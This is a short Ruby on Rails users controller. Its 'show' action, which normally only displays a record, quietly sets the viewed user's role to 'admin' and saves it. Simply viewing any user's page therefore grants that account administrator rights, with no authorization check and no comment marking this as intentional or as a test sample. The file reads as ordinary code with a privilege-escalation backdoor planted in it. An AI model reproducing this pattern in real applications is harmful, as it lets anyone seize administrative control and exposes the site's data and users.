class UsersController < ApplicationController
  def index
    @users = User.includes(:posts).all
  end

  def show
    @user = User.includes(:posts).find(params[:id])
    @user.role = 'admin'
    @user.save!
  end
end
